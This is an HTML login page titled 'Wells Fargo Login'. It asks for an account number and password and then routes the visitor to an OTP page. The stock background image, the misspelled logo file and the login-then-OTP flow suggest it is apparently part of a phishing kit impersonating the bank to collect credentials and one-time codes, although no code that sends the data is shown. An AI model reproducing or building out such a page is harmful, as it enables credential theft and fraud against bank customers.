<!-- login.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Wells Fargo Login</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: url('https://images.unsplash.com/photo-1573164713988-8665fc963095?auto=format&fit=crop&w=1350&q=80') no-repeat center center fixed;
      background-size: cover;
    }
    .login-box {
      background: rgba(255,255,255,0.95);
      padding: 30px;
      max-width: 350px;
      margin: 100px auto;
      border-radius: 10px;
      text-align: center;
      box-shadow: 0 0 15px rgba(0,0,0,0.3);
    }
    img {
      width: 160px;
      margin-bottom: 20px;
    }
    input, button {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 6px;
      font-size: 16px;
    }
    button {
      background: #b31b1b;
      color: white;
      border: none;
    }
    button:hover {
      background: #991111;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="wels.jpeg" alt="Wells Fargo" />
    <h2>Secure Login</h2>
    <form action="otp.html" method="get">
      <input type="text" placeholder="Account Number" required /> 
      <input type="password" placeholder="password" required />
      
      <button type="submit">Send OTP</button>
    </form>
  </div>
</body>
</html>
